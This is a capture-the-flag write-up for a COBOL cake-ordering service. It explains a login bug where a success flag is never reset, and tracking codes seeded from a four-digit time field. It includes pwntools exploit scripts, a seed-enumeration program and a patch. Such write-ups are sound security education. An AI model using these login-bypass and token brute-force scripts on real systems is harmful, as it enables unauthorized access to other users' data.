This is a writeup I wrote together with Lorenz, first published on [saarsec.](https://saarsec.rocks/2025/10/02/FAUSTCTF-cake-configurator.html)

## Overview

`cake-configurator` is a COBOL-based TCP service that allows users to configure and order cakes and track their orders conveniently in the terminal.
Connecting via `socat` yields a user interface that prompts us to either register or login.

## First steps
Do you know COBOL?
No?
Us neither!

{{< centerimage src="https://saarsec.rocks/assets/faust2025/cobol.jpg" alt="Dodge car" maxWidth="400px" >}}

AI mostly sucks with solving entire challenges, but it's great at summarizing, so we decided to have a quick COBOL crash course with ChatGPT.
Here are the key takeaways:
* COBOL code is split into four divisions: `IDENTIFICATION`, `ENVIRONMENT`, `DATA`, and `PROCEDURE`. For our purposes, the most important ones are the `DATA` and `PROCEDURE` divisions, since that's where variables, parameters, and functions are defined.
* The `DATA DIVISION` is again split into multiple sections. The key ones to know are:
    * `WORKING-STORAGE SECTION`: for static variables
    * `LINKAGE SECTION`: for parameters and return values
    * `SCREEN SECTION`: for data defining terminal user interfaces
* The `PICTURE` (or `PIC`) clause defines the type and size of a memory portion. A `9` represents a numeric digit, so `PIC 9(5)` defines a numeric field that holds 5 digits.

While the syntax takes some time getting used to, the code is decently intuitive to read.

## The first vulnerability

### Logins are quite optimistic

One interesting thing we noticed early on is that the `WS-SUCCESS` variable in `LOGIN.cob` is initialized to `"F"` (for `false`), but the code only ever updates it to `"T"` (for `true`).
It is never set back to false.
Since this variable is used to determine whether a login was successful, once it's set to `"T"` after a successful login, all future login attempts will succeed, regardless of whether the password check actually passes.

```cobol {hl_lines=[15, 30, 46, 47]}
        PROCEDURE DIVISION USING LNK-UNAME LNK-MSG.
            PERFORM FOREVER
                DISPLAY LOGIN-SCREEN
                DISPLAY EOP-INDICATOR
                ACCEPT LOGIN-SCREEN
                EVALUATE WS-RESPONSE
                WHEN "C"
                    PERFORM LOGIN-USER
                WHEN "M"
                    GOBACK
                WHEN OTHER
                    MOVE SPACES TO WS-RESPONSE
                    MOVE "Invalid action" TO WS-MSG
                END-EVALUATE
                IF WS-SUCCESS = "T"
                THEN
                MOVE "login successful" TO LNK-MSG
                MOVE WS-UNAME TO LNK-UNAME
                GOBACK
                END-IF
            END-PERFORM.

        LOGIN-USER.
            MOVE  "pgsql://cake_db:5432/app"  TO  SQL-DS.
            EXEC SQL
                CONNECT TO :SQL-DS USER cake_user USING ilovecake
            END-EXEC.
            IF  SQLCODE NOT = ZERO PERFORM SQL-ERROR EXIT PARAGRAPH.

            PERFORM SQL-CHECK-USER.

            EXEC SQL
                DISCONNECT
            END-EXEC.
            EXIT PARAGRAPH.

        SQL-CHECK-USER.
            MOVE WS-UNAME TO SQL-UNAME.
            MOVE WS-PW TO SQL-PW.

            EXEC SQL
                SELECT COUNT(*) INTO :SQL-CNT FROM USERS
                WHERE USERNAME = :SQL-UNAME AND PASSWORD = :SQL-PW
            END-EXEC.
            IF SQLCODE NOT = ZERO PERFORM SQL-ERROR EXIT PARAGRAPH.
            IF SQL-CNT = 0 MOVE "Invalid username or password" TO WS-MSG.
            IF SQL-CNT = 1 MOVE "T" TO WS-SUCCESS.
            EXIT PARAGRAPH.
```

As you can see in the code above, if `SQL-CNT = 0` (which happens when the username or password is incorrect), `WS-SUCCESS` is never reset to `"F"`.
The variable is only initialized to `"F"` in the data division:

```cobol {hl_lines=[5]}
        DATA DIVISION.
        WORKING-STORAGE SECTION.
        EXEC SQL INCLUDE SQLCA END-EXEC.
        01  WS-LOGIN.
            05 WS-SUCCESS          PIC X(01) VALUE "F".
            05 WS-UNAME            PIC X(32) VALUE SPACES.
            05 WS-PW               PIC X(32) VALUE SPACES.
            05 WS-RESPONSE         PIC X(01) VALUE "C".
            05 WS-MSG              PIC X(32) VALUE "Please login".
```

Therefore, after a first successful login, the variable stays true.


### Logged-in, logged-out? Who cares!

So, can we just log out after a successful login and log in as a different user?
Unfortunately, no: there's no logout functionality, unless you quit the application.
Restarting the app, however, does reset `WS-SUCCESS` back to `"F"`.
And once you're logged in, you can't simply log in again as someone else, right?
If you remember from the asciinema recording, there's no login option shown after you've already logged in.
At first glance, it might seem that way because the login menu option disappears after you've logged in:

```cobol
        05  LOGGEDOUT-SECTION.
            10  VALUE "(L)OGIN - User Login" LINE 04 COL 02.
```

However, the code that handles the login menu option doesn't check for that:
```cobol {hl_lines=[8, 9, 10, 11, 12]}
        PROCEDURE DIVISION.
            DISPLAY WELCOME-SCREEN
            DISPLAY EOP-INDICATOR
            ACCEPT WELCOME-SCREEN
            PERFORM UNTIL WS-MENU IS EQUAL TO "Q"
                EVALUATE WS-MENU
                WHEN "L"
                    MOVE SPACES TO WS-MENU
                    CALL "LOGIN" USING WS-UNAME WS-MSG
                    IF WS-UNAME IS NOT EQUAL TO SPACES
                        MOVE 1 TO WS-LOGGED-IN
                    END-IF
...
```

Therefore, we can just log in again!
And since the second login can't fail (`WS-SUCCESS` is `"T"`), we can actually log in as any user while logged in as someone else.

### The exploit

In short: register an account, log in with it, then log in again as a target user and view their cake orders - the flags are stored there.
We get the usernames as flag IDs.
So, the full exploit boils down to:

```python
from pwn import *

# connect to the target team's service
r = remote(f"fd66:666:{team_id}::2", 4321)

# choose a random username which we will register (so we can log into a known user)
username = "user_" + str(random.randrange(999999999))

# some input is required to open the (M)ain menu
r.sendline(b"M")
# (R)egister a user
r.sendline(b"R")
# send the username, leave the password blank
r.sendline(username.encode())
# (L)og in
r.sendline(b"L")
# send the username, leave the password blank
r.sendline(username.encode())
# now, (L)og in again
r.sendline(b"L")
# we send the name of the target user, and leave the password blank (any password works)
r.sendline(TARGET_USER.encode())
# finally, we can (V)iew the cake orders
r.sendline(b"V")

# there might be multiple pages so we go to the (N)ext one a few times
for i in range(10):
    r.sendline(b"N")
# go back to the (M)enu
r.sendline(b"M")
# (Q)uit the application
r.sendline(b"Q")

printflags(r.recvall().decode()) # somewhere in the output there should be flags
```

### Fixing the vulnerability

The bug is easy to fix: set `WS-SUCCESS` to `"F"` before each login attempt:

```cobol {hl_lines=[6]}
        PROCEDURE DIVISION USING LNK-UNAME LNK-MSG.
            PERFORM FOREVER
                DISPLAY LOGIN-SCREEN
                DISPLAY EOP-INDICATOR
                ACCEPT LOGIN-SCREEN
+               MOVE "F" TO WS-SUCCESS
                EVALUATE WS-RESPONSE
                WHEN "C"
                    PERFORM LOGIN-USER
                WHEN "M"
                    GOBACK
                WHEN OTHER
                    MOVE SPACES TO WS-RESPONSE
                    MOVE "Invalid action" TO WS-MSG
                END-EVALUATE
                IF WS-SUCCESS = "T"
                THEN
                MOVE "login successful" TO LNK-MSG
                MOVE WS-UNAME TO LNK-UNAME
                GOBACK
                END-IF
            END-PERFORM.
```

It still leaves some edge cases (like trying to create orders while unauthenticated), but it closes this leak vector, so good enoughâ„¢ for a CTF.

## The second vulnerability

### Not so random

Another interesting thing we discovered is how tracking codes are generated.
These codes let anyone view cake orders, even if they didn't place the order themselves.
Since the cake orders contain flags, knowing the tracking code means you can retrieve the flag.
Hence, if tracking codes are predictable, flags aren't secure.
Let's take a look what tracking orders are:

```cobol
        DATA DIVISION.
        WORKING-STORAGE SECTION.
        EXEC SQL INCLUDE SQLCA END-EXEC.
        01  WS-TRACKINGID.
            10 WS-UID      PIC 9(05).
            10 WS-RAND     PIC X(11).
```

Essentially, the tracking codes have two parts: the user ID (which we're *mostly* given as flag IDs, more on that shortly) and a supposedly random value.
Let's take a look at how `WS-RAND` is generated:

```cobol
        DATA DIVISION.
        WORKING-STORAGE SECTION.
        EXEC SQL INCLUDE SQLCA END-EXEC.
        01  WS-TRACKINGID.
            10 WS-UID      PIC 9(05).
            10 WS-RAND     PIC X(11).
        01 WS-TIME.
            10 WS-MICROSEC PIC 9(04).
            10 WS-SEC      PIC 9(02).
            10 WS-MIN      PIC 9(02).
            10 WS-HOUR     PIC 9(02).
        01 WS-RNG.
            10 WS-NDX      PIC S9(02) COMP.
            10 WS-RANDI    PIC 9(02).
            10 WS-ALPH     PIC X(36) VALUES
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".

        ...

        PROCEDURE DIVISION USING LNK-TID LNK-UNAME LNK-MSG.
            PERFORM SQL-GETUID.

            ACCEPT WS-TIME FROM TIME
            COMPUTE WS-RANDI = FUNCTION RANDOM(WS-MICROSEC)*26 + 1
            PERFORM VARYING WS-NDX FROM 1 BY 1 UNTIL WS-NDX>11
                COMPUTE WS-RANDI = Function RANDOM*36 + 1
                STRING WS-ALPH(WS-RANDI:1) INTO WS-CSB(WS-NDX)
            END-PERFORM.
            MOVE WS-STRARR TO WS-RAND.

            MOVE WS-TRACKINGID TO LNK-TID
            GOBACK.
...
```

Essentially, the random number generator is seeded with `WS-MICROSEC` (`RANDOM(WS-MICROSEC)`), so the random value is deterministically derived from that seed.
At first glance that looks okay:
there are one million microseconds in a second, so even if you only knew the order time to the nearest second, you'd still have to brute-force a million possible seeds.
That's not great, and not entirely infeasible.
You might be able to recover a few flags over the course of the CTF, but it's far from reliable.

Additionally, the flag IDs we were given omit the last digit of the user ID.
That increases the search space to about ten million values.
You might get a flag this way, but only a couple.

### 1000us.
But there's a major caveat:
the *type* of `WS-MICROSEC` is declared as `PIC 9(04)`, which is a four-digit value.
This means, there aren't one million but only ten thousand possible seeds.
Including the missing final digit of the user ID, we can bring the search space down to 100,000 values.
Not great, but enough to recover some flags.

### Pre-computing values
I have no idea how the COBOL random number generator works internally, and I do not intent to find out.
Instead, I just copied the code to generate all possible `WS-RAND` values:

```cobol
        IDENTIFICATION DIVISION.
        PROGRAM-ID. RANDOMGEN.

        DATA DIVISION.
        WORKING-STORAGE SECTION.
        01  WS-SEED           PIC 9(04).
        01  WS-RANDOM-FLOAT   USAGE COMP-1.
        01  WS-RANDOM-INT     PIC 9(04).
        01  WS-TRACKINGID.
            10 WS-UID      PIC 9(05).
            10 WS-RAND     PIC X(11).
        01 WS-TIME.
            10 WS-MICROSEC PIC 9(04).
            10 WS-SEC      PIC 9(02).
            10 WS-MIN      PIC 9(02).
            10 WS-HOUR     PIC 9(02).
        01 WS-RNG.
            10 WS-NDX      PIC S9(02) COMP.
            10 WS-RANDI    PIC 9(02).
            10 WS-ALPH     PIC X(36) VALUES
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".
        01 WS-STRARR.
            02 WS-ARR OCCURS 12 TIMES.
                05 WS-CSB    PIC X(01).
        01  SQL-DS         PIC X(64).
        01  SQL-UNAME      PIC X(32) VALUE SPACES.

        PROCEDURE DIVISION.
            DISPLAY "Enter a 4-digit seed (0000 - 9999):"
            ACCEPT WS-SEED
            COMPUTE WS-RANDI = FUNCTION RANDOM(WS-SEED)*26 + 1
            PERFORM VARYING WS-NDX FROM 1 BY 1 UNTIL WS-NDX>11
                COMPUTE WS-RANDI = Function RANDOM*36 + 1
                STRING WS-ALPH(WS-RANDI:1) INTO WS-CSB(WS-NDX)
            END-PERFORM.

            MOVE WS-STRARR TO WS-RAND.
            DISPLAY WS-RAND.

            STOP RUN.
```

With that, we can pre-compute every possible value for `WS-RAND`.
Then we just brute-force all combinations of those values and the missing digit from the user ID.

```python
from pwn import *

# connect to the service for the target team
r = remote(TEAM, 4321)

r.sendline(b"M") # open the menu
i = 0

# iterate all possible values for the missing user id digit
for k in range(10):
    # iterate all possible WS-RAND values
    for line in open("ws-rand.txt"):
        # every 500 values we scan for the flag and re-open the connection if not found
        if i % 500 == 0 and i:
            # (Q)uit the application
            r.sendline("Q")
            # check whether flag was found
            if printflags(r.recvall(timeout=15)):
                print("FOUND FLAG")
                quit()
            # reconnect
            r = remote(TEAM, 4321)
        # go to the (T)racking menu
        r.sendline(b"T")
        # enter guess for tracking ID
        r.sendline((prefix + str(k) + line).encode())
        # go back to the (M)enu
        r.sendline(b"M")

    # finally, close the connection and scan for the flag
    r.sendline(b"Q")
    if printflags(r.recvall()):
        print("FOUND FLAG")
        quit()
```

After the competition was over, David from FAUST pointed out that the variable names are misleading.
In the [official definition](https://www.ibm.com/docs/en/cobol-zos/6.3.0?topic=functions-current-date) of the struct, the variable order is different:
```cobol
        WORKING-STORAGE SECTION.
        01  WS-CURRENT-DATE-FIELDS.
            05  WS-CURRENT-DATE.
                10  WS-CURRENT-YEAR    PIC  9(4).
                10  WS-CURRENT-MONTH   PIC  9(2).
                10  WS-CURRENT-DAY     PIC  9(2).
            05  WS-CURRENT-TIME.
                10  WS-CURRENT-HOUR    PIC  9(2).
                10  WS-CURRENT-MINUTE  PIC  9(2).
                10  WS-CURRENT-SECOND  PIC  9(2).
                10  WS-CURRENT-MS      PIC  9(2).
            05  WS-DIFF-FROM-GMT       PIC S9(4).
        PROCEDURE DIVISION.
            MOVE FUNCTION CURRENT-DATE TO WS-CURRENT-DATE-FIELDS
```
Instead of microseconds, we obtain hours and minutes in the field, making it trivial to brute-force.
Assuming that the vulnboxes can be hosted in different countries, and that the [maximum time difference between two countries is 26,](https://en.wikipedia.org/wiki/Time_zone) this brings the search space down to around 26 possible values.
